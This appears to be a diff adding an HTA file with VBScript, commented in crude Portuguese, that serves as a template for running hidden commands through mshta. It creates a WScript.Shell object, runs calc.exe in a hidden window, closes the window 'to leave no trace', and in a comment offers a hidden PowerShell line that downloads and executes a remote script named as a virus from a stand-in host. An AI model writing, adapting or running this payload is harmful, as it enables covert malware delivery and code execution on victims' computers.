@@ -1,0 +1,24 @@
+<html>
+<head>
+<script language="VBScript">
+    '
+    ' >>> O CÓDIGO DO DIABO VAI AQUI DENTRO <<<
+    '
+    
+    ' 1. Cria um objeto "Shell" pra gente poder rodar comandos no sistema
+    Set objShell = CreateObject("Wscript.Shell")
+    
+    ' 2. A nossa "maldade": executar a calculadora.
+    '    Troca "calc.exe" pelo comando que tu quiser, seu arrombado.
+    '    Exemplo: "powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://teusite.com/teuvirus.ps1' )\""
+    objShell.Run "calc.exe", 0, True
+    
+    ' 3. Fecha a janela invisível do mshta pra não deixar rastro.
+    window.close()
+
+</script>
+</head>
+<body>
+    <!-- O corpo fica vazio pra janela ser invisível -->
+</body>
+</html>
